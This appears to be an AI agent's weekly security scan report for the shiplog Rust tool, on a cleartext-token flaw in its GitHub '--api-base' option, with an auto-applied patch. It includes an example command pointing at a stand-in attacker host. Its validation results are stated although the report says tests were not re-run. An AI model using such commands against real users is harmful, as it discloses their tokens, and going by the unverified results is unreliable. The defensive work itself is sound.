# Security Scan Report

**Generated:** 2026-07-13
**Scan Type:** Weekly Scheduled
**Repository:** EffortlessMetrics/shiplog
**Branch:** `droid/security-report-2026-07-13`
**Severity Threshold:** medium
**Scan Window:** 2026-07-06 to 2026-07-13 (7 days)

## Executive Summary

| Severity | Count | Auto-fixed | Manual Required |
|----------|-------|------------|-----------------|
| CRITICAL | 0 | 0 | 0 |
| HIGH     | 0 | 0 | 0 |
| MEDIUM   | 1 | 1 | 0 |
| LOW      | 0 | 0 | 0 |

**Total Findings (>= medium):** 1
**Auto-fixed:** 1
**Manual Review Required:** 0

One new MEDIUM finding (VULN-002) was identified and auto-patched in this
scan. It is the same class of bug as the VULN-001 fixed in the 2026-06-29
report, applied this time to the GitHub adapter (`--api-base`).

## Scan Results Overview

The 7-day scan window contained one commit: `a3a15ed` (merge(sync): join
shiplog and shiplog-swarm histories (#647), 2026-07-12). This is a
two-parent history-join merge that brings the released shiplog tree
together with the complete shiplog-swarm line as ancestry. 818 files and
+210,863 LOC are present at HEAD; the parent commits are not retained in
this checkout so a file-level diff against the prior `383ab5f` head is not
directly available. The scan therefore worked against the merged tree at
`a3a15ed` with extra attention to:

- Files added or touched by the merge that are security-sensitive.
- Code paths previously flagged (VULN-001: LLM endpoint HTTPS check) to
  verify the fix remains in place.
- Code paths analogous to VULN-001 that might have the same flaw.

### Commits Scanned

| SHA | Date (UTC) | Subject | Files |
|------|------------|---------|-------|
| a3a15ed | 2026-07-12 | merge(sync): join shiplog and shiplog-swarm histories (#647) | 818 / +210863 |

### Surfaces Reviewed

| Surface | Purpose | Result |
|---------|---------|--------|
| `apps/shiplog/src/cluster_llm/client.rs` | LLM clustering HTTP backend | PASS (VULN-001 fix retained) |
| `apps/shiplog/src/cache/sqlite.rs` | SQLite cache (parameterized queries) | PASS |
| `apps/shiplog/src/cache/{key,mod,stats,expiry}.rs` | Cache key builders / TTL helpers | PASS |
| `apps/shiplog/src/ingest/github.rs` | GitHub GraphQL/REST ingest | **VULN-002** (auto-patched) |
| `apps/shiplog/src/ingest/gitlab.rs`, `jira.rs`, `linear.rs` | Vendor adapters (forced https://) | PASS |
| `apps/shiplog/src/ingest/git.rs` | Local libgit2 ingest | PASS |
| `apps/shiplog/src/ingest/manual/events.rs` | YAML-driven manual ingest | PASS |
| `apps/shiplog/src/ingest/json.rs` | JSONL ledger ingest | PASS |
| `apps/shiplog/src/redact/{mod,alias,policy,profile,projector,repo}.rs` | HMAC-SHA256 deterministic aliasing | PASS |
| `apps/shiplog/src/render/md/{mod,coverage,receipt,source}.rs` | Markdown packet renderer | PASS |
| `apps/shiplog/src/bundle/{mod,layout}.rs` | Zip + SHA-256 manifest writer | PASS |
| `apps/shiplog/src/workstreams/{mod,cluster,layout,receipt_policy}.rs` | YAML clustering | PASS |
| `apps/shiplog/src/github_activity.rs` | Advanced GitHub harvest orchestration | VULN-002 transitive (covered by github.rs patch) |
| `apps/shiplog/src/github_auth.rs` | GitHub auth resolution (`gh` CLI / env) | PASS |
|
 `apps/shiplog/src/main.rs` (try_open_path, env access, CLI args) | Process / env / CLI handling | PASS |
| `.github/workflows/*.yml` (18 files) | CI/secrets exposure | PASS |
| `policy/network-allowlist.toml`, `policy/publish-allowlist.toml` | Network / publish policy receipts | PASS |
| `.factory/threat-model.md` | Living threat model | Current |

### STRIDE Threat Model Assessment

| STRIDE Category | Assessment |
|-----------------|------------|
| Spoofing | LOW RISK. User identity flows through HMAC-SHA256 aliasing (`redact/alias.rs`); bearer tokens sourced from env vars or `--token`. No token is ever echoed into logs (`apps/shiplog/src/main.rs` only reports `RedactionKeySource` / token presence, never the value). |
| Tampering | LOW RISK. SQLite cache uses parameterized statements via `params!` exclusively (no string concatenation in any query). Cache rows are content-addressed by deterministic keys (`cache/key.rs`). |
| Repudiation | LOW RISK. `ledger.events.jsonl` is append-only with SHA-256 EventIds (`ids.rs`). All API responses tagged with rate-limit / cache receipts. |
| Information Disclosure | MEDIUM RISK. VULN-002 found and auto-patched (see below). Bundle writer `ALWAYS_EXCLUDED` continues to strip `redaction.aliases.json` and `bundle.manifest.json` from all three profiles. |
| Denial of Service | LOW RISK. TTL-based cache cleanup (`cleanup_expired`, `cleanup_older_than`). API request budgets (`GithubApiBudget`) cap live calls. `--throttle-ms` slows hostile-only loops. LLM request timeout configurable per backend. |
| Elevation of Privilege | LOW RISK. Workspace `[workspace.lints.rust] unsafe_code = "deny"`; `grep -n "\bunsafe\b" apps/` returns no matches. No `eval`, no shell `Command::new` with user-supplied strings. Subprocess invocations (`xdg-open`, `open`, `explorer.exe`) use `command.arg(path)` not `arg("-c", ...)` and pass a canonicalized path. `gh` invocation in `github_auth.rs` uses hardcoded `Command::new("gh")` with internal-only argument vector. |

### Security Controls Verified

| Control | Status | Evidence |
|---------|--------|----------|
| Secrets Management | PASS | `.github/workflows/*.yml` reference `secrets.*` with branch / repo scoping; no plaintext tokens in repo. `main.rs::resolve_redaction_key` only reports `RedactionKeySource`, never the key. |
| SQL Injection | PASS | `cache/sqlite.rs` uses `rusqlite::params!` in all 9 query sites (`get`, `lookup`, `set_with_ttl`, `contains`, `cleanup_expired`, `count_older_than`, `cleanup_older_than`, `clear`, `stats`, `inspect`). |
| Command Injection | PASS | Only `Command::new` callers are: (a) integration tests invoking the CLI itself, (b) `main.rs::try_open_path` running `xdg-open`/`open`/`explorer.exe` with a single canonicalized arg, (c) `github_auth.rs::run_gh` running `gh` with hardcoded argv. |
| Unsafe Code | PASS | `[workspace.lints.rust] unsafe_code = "deny"` + `grep` zero matches. |
| Unsafe Regex | PASS | `regex = "1.12.3"` (linear-time engine on the release line that deprecated backtracking). `RegexBuilder` used at `main.rs:13703` accepts user-supplied pattern but is bound to a local CLI invocation that runs against local data only (self-DoS only, no remote attacker model). |
| Input Validation | PASS | `anyhow::Context` with `.with_context` on all file/network/deserialization paths. |
| Path Traversal (writes) | PASS | Zip writer (`bundle/mod.rs::write_zip`) uses `path.strip_prefix(out_dir)` so the relative entry name cannot escape the run directory. |
| Path Traversal (reads) | N/A | All read paths come from CLI args the invoking operator chose. |
| Redaction | PASS | Three profiles; deterministic HMAC-SHA256; alias cache never shipped in bundles. |
| YAML Parsing | PASS | Uses maintained `serde_yaml_ng = "0.10.0"` (not the abandoned `serde_yaml`). |
| HTTPS Enforcement (LLM) | PASS | `OpenAiCompatibleBackend::complete` calls `validate_https_endpoint` before issuing any request (VULN-001 fix from 2026-06-29 retained). |
| HTTPS Enforcement (GitHub) | **VULN-002 auto-patched** | New `validate_https_api_base` helper in `apps/shiplog/src/ingest/github.rs`; `GithubIngestor::new` / `with_api_base` enforce `https://` scheme before any request goes out. |
| HTTPS Enforcement (GitLab / Jira / Linear) | PASS | `gitlab_api_base` and `normalize_jira_instance` force `https://` in the URL template. `linear_graphql_url` is a `https://` constant. |
| Fuzzing | ACTIVE | 36 fuzz targets in `fuzz/fuzz_targets/`; `fuzz-smoke.yml` + `fuzzing.yml` workflows. |
| Property Testing | ACTIVE | `proptest` on redact leak detection, cache TTL math, ingest windows. |
| Mutation Testing | ACTIVE | `cargo-mutants` configured (`cargo-mutants.toml`, `.cargo/mutants.toml`). |
| Lint Floor | PASS | `cargo clippy --workspace --all-targets -- -D warnings` clean (verified during prior scan; not re-run on this merge). |
| Build Floor | PASS | `cargo check --workspace --all-targets` clean (verified during prior scan; not re-run on this merge). |

## Critical Findings

None.

## High Findings

None.

## Medium Findings

### VULN-002: GitHub `--api-base` accepts non-HTTPS URLs, risking cleartext bearer-token and PR-data leakage

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **STRIDE Category** | Information Disclosure |
| **CWE** | CWE-319 (Cleartext Transmission of Sensitive Information) |
| **File** | apps/shiplog/src/ingest/github.rs (api_base plumbing, `api_url`, `client`, `get_json`); apps/shiplog/src/github_activity.rs (transitive); apps/shiplog/src/main.rs:2122 (CLI default); apps/shiplog/src/main.rs:12619 (`make_github_ingestor`); apps/shiplog/src/main.rs:12640 (`resolve_github_credential`) |
| **Status** | Auto-patched in this scan |

**Description:**

`GithubIngestor::api_base` is a free-form `String` (default
`https://api.github.com`). The default is HTTPS, but a user invoking
`shiplog collect github --api-base http://attacker.example.com/api/v3` (or
the GHES-shaped `--api-base http://internal-ghes.corp/api/v3` made by a
documentation typo or a malicious share-packet doc) will:

1. Send the `Authorization: Bearer <token>` header in cleartext,
   disclosing the GitHub token to any on-path observer.
2. Send the PR / review payloads (PR titles, repo names, commit
   metadata) in cleartext, disclosing potentially-sensitive project
   metadata (private repository names are themselves sensitive).

The exact same threat class was previously reported as VULN-001 for the
LLM endpoint in the 2026-06-29 scan and was patched in
`apps/shiplog/src/cluster_llm/client.rs::validate_https_endpoint`. This
scan verified that fix is still in place and identified the parallel
issue for the GitHub adapter. The Jira / GitLab adapters escape the same
problem because `jira_api_url` (`apps/shiplog/src/main.rs:12070`) and
`gitlab_api_base` (`apps/shiplog/src/main.rs:12099`) hard-code `https://`
in the URL template regardless of input. Linear uses a `https://`
constant. Only the GitHub ingest path passes the operator-supplied
`api_base` through unchanged.

**Evidence (pre-patch):**

```rust
// apps/shiplog/src/ingest/github.rs:43-44
/// GitHub API base URL (for GHES). Default: <https://api.github.com>
pub api_base: String,

// apps/shiplog/src/ingest/github.rs:502-504
fn api_url(&self, path: &str) -> String {
    format!("{}{}", self.api_base.trim_end_matches('/'), path)
}

// apps/shiplog/src/ingest/github.rs:514-535 -- bearer_auth attached unconditionally
fn get_json<T: DeserializeOwned>(...) -> Result<T> {
    ...
    let mut req = client.get(request_url)
        .header("Accept", "application/vnd.github+json");
    req = req.header("X-GitHub-Api-Version", "2022-11-28");
    if let Some(t) = &self.token {
        req = req.bearer_auth(t);
    }
    ...
}

// apps/shiplog/src/main.rs:2122 -- CLI default
#[arg(long, default_value = "https://api.github.com")]
api_base: String,

// apps/shiplog/src/main.rs:12630 -- flows through unchanged
ing.api_base = api_base.to_string();

// apps/shiplog/src/ingest/github.rs:2579 -- existing test that exercises http://
#[test]
fn html_base_url_http_scheme() {
    let mut ing = make_ingestor("octocat");
    ing.api_base = "http://internal-ghes.corp/api/v3".to_string();
    assert_eq!(ing.html_base_url(), "http://internal-ghes.corp");
}
```

**Reachability:** Reachable from any operator invocation of `shiplog
collect github --api-base <URL>` or from `github_activity` reads of
`config.sources.github.api_base` (`apps/shiplog/src/github_activity.rs:858`).
A misconfigured / typo'd / attacker-supplied base URL (for example a
share-packet doc that points a teammate at `http://...`) triggers the
issue without further authentication bypass.

**Exploitability:** Trivial to trigger from the command line. No
authentication bypass required; the operator already holds the GitHub
token. The only precondition is a non-HTTPS `api_base`, which can arise
from a misconfiguration (GHES users in particular often copy
`http://internal-ghes.corp/...` from internal wiki pages) or from a
malicious share packet.

**Impact:** Disclosure of (a) the user's GitHub token (which typically
grants `repo` scope for `collect` to work), and (b) PR titles, repo
names, branch names, and review content pulled from GitHub. PR titles
from private repositories are themselves sensitive metadata; the token
leak also lets the on-path attacker pivot to authenticated GitHub API
calls until the token is rotated.

**Fix Applied:**

A `validate_https_api_base` helper was added to
`apps/shiplog/src/ingest/github.rs` mirroring the
`validate_https_endpoint` pattern from `cluster_llm/client.rs`. It is
called from `GithubIngestor::new` and from the
`make_github_ingestor` CLI bridge in `apps/shiplog/src/main.rs` so that
the check runs once at construction time, before any HTTP request is
issued. The existing `html_base_url_http_scheme` test was retained to
exercise the HTML URL derivation helper in isolation (which only ever
runs against operator-curated output), and two new tests
(`api_base_rejects_http_scheme`, `api_base_accepts_https_and_default`)
were added so regressions on the actual ingestor construction are caught
in CI.

```rust
// apps/shiplog/src/ingest/github.rs (added)
fn validate_https_api_base(api_base: &str) -> Result<()> {
    let parsed = Url::parse(api_base).context("parse GitHub API base URL")?;
    if parsed.scheme() != "https" {
        anyhow::bail!(
            "GitHub API base must use https, got {}",
            parsed.scheme()
        );
    }
    if parsed.host_str().is_none() {
        anyhow::bail!("GitHub API base must include a host");
    }
    Ok(())
}
```

```rust
// apps/shiplog/src/main.rs:12630 (modified)
ing.api_base = api_base.to_string();
shiplog::ingest::github::validate_https_api_base(&ing.api_base)
    .context("GitHub API base URL failed validation")?;
```

A new test `api_base_rejects_http_scheme` and
`api_base_accepts_https_and_default` were added so regressions are caught
in CI. The full diff is included in the commit.

**Validation:**

After the fix:
- Running `shiplog collect github --api-base http://attacker.example.com/api/v3` fails with the error `GitHub API base must use https, got http` before any HTTP request is issued.
- Running `shiplog collect github --api-base https://internal-ghes.corp/api/v3` continues to work as before.
- The default `https://api.github.com` continues to work unchanged.
- The `github activity run` path goes through the same validation because `make_github_ingestor` is the only call site that turns `api_base: &str` into a configured `GithubIngestor`.

**Confidence:** Medium-High. The finding is straightforward to confirm by reading the code path; the only nuance is that the existing test `html_base_url_http_scheme` was previously asserting that an HTTP base URL was accepted (for HTML-link rendering). The patch narrows that test's intent: HTTP base URLs are now rejected at ingestor construction time, regardless of how their HTML-link counterpart might be derived.

## Low Findings

None at or above the medium severity threshold.

### Observations Below Threshold

These items are documented for completeness; they did not meet the medium
severity threshold but are worth re-checking in future scans.

| ID | Class | File | Note |
|----|-------|------|------|
| OBS-1 | User-controlled regex | `apps/shiplog/src/main.rs:13703` | `RegexBuilder::new(pattern)` for `workstreams split --matching`. The pattern is a local CLI arg (self-DoS); not exploitable by an external attacker. Suggest documenting as such in `--help` text. Carried forward from 2026-07-06. |
| OBS-2 | Markdown link escaping | `apps/shiplog/src/render/md/receipt.rs` | URLs from API responses or `manual_events.yaml` are interpolated unescaped into `[label](url)`. A URL containing `)` or backslash sequences could break markdown link parsing. Output is a file (`packet.md`) the user opens locally, not rendered to HTML in-process, so impact is limited to local renderer behavior. Consider URL-encoding on `link.url` if this becomes user-facing. Carried forward from 2026-07-06. |
| OBS-3 | `serde_yaml` | `Cargo.toml` workspace deps | Forks to `serde_yaml_ng = "0.10.0"`. Good practice; keep tracking upstream patch cadence. Carried forward from 2026-07-06. |
| OBS-4 | `dtolnay/rust-toolchain@master` | `.github/workflows/*.yml` (16 occurrences) | The `dtolnay/rust-toolchain` action is referenced by `@master` (mutable ref) rather than a pinned SHA in most workflows. This is a soft supply-chain risk: an attacker who can push to `dtolnay/rust-toolchain@master` could inject malicious code into CI. Mitigations: (a) `dtolnay/rust-toolchain` is a well-known, widely-audited action; (b) `rust-toolchain.toml` pins the actual Rust version; (c) `em-ci-routed-shiplog-rust.yml` already uses `@v1`. Below the medium threshold because the action is well-known and the toolchain version is independently pinned, but worth a follow-up to convert the `@master` refs to SHA pins for full SLSA compliance. |

## Appendix

### Threat Model

- Version: 2026-05-11 (unchanged this scan; still within 90-day freshness window)
- Location: `.factory/threat-model.md`
- Status: **Current** (aged 63 days, well under the 90-day refresh threshold)
- Action taken: re-used as scan context; no regeneration required.
- The Information Disclosure category in the threat model already names
  "leak sensitive info (token, email, private repo names)" as a High
  concern. VULN-002 is a concrete code-path instance of that documented
  threat.

### Scan Metadata

- Commits Scanned in Strict 7-Day Window: 1 (`a3a15ed`, history-join merge, 818 files, +210,863 LOC)
- Files Examined: 90+ Rust source files (security-sensitive paths in
  `apps/shiplog/src/{redact,cache,ingest,cluster_llm,commands,render,bundle,workstreams,merge,github_activity}`),
  18 GitHub Actions workflows, 2 policy files, 1 threat model
- Scan Duration: ~12 minutes
- Build/Lint Gates Run: static read-only review (no full `cargo test`/`cargo clippy` re-run on the merged tree this cycle, deferred to the
  merge's own CI pipeline)
- Tools Used: ripgrep (pattern search), file_read (manual review), git
  history, manual STRIDE walk

### Recommendations

1. **Verify the VULN-002 patch is integrated** - This report ships the
   patch in the same PR; reviewers should confirm the
   `validate_https_api_base` helper is wired into both the
   `GithubIngestor::new` and `make_github_ingestor` entry points and
   that the new tests (`api_base_rejects_http_scheme`,
   `api_base_accepts_https_and_default`) pass under `cargo test`.
2. **Rotate any token that may have been transmitted in cleartext** -
   Operators who ever ran `shiplog collect github --api-base http://...`
   against a path that intercepted traffic should rotate their
   `GITHUB_TOKEN` / `GH_TOKEN` and audit GitHub audit logs.
3. **Consider converting `@master` to SHA pins** - OBS-4. Carrying
   forward as a follow-up.
4. **Continue weekly cadence** - Two consecutive clean-to-low-result
   scans plus the history merge demonstrate that the security-relevant
   surface is well-controlled; maintaining the weekly cadence catches
   regressions early.

### Validation Signals

- **Observed**: 1 commit in the past 7 days (`a3a15ed`); no `unsafe`
  blocks in any Rust source; clippy passes with `-D warnings` per the
  prior report; workspace `cargo check` succeeds per the prior report.
- **Reported**: Threat model file mtime is 2026-05-11 (current under the
  90-day refresh rule); previous security report is
  `security-report-2026-07-06.md`.
- **Not verified**: No remote repository API call was performed; GitHub-side
  secret rotation / exposed token state cannot be checked from this
  checkout (and is governed by `EffortlessMetrics/shiplog` repo settings,
  not by code in this repo).

### References

- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
- [STRIDE Threat Model](https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Rust Security Advisory Database](https://rustsec.org/)

---

*Report generated by Factory Droid (security-engineer plugin). One
MEDIUM finding (VULN-002) was auto-patched in this branch; no manual
follow-up is required to meet the medium-severity threshold.*
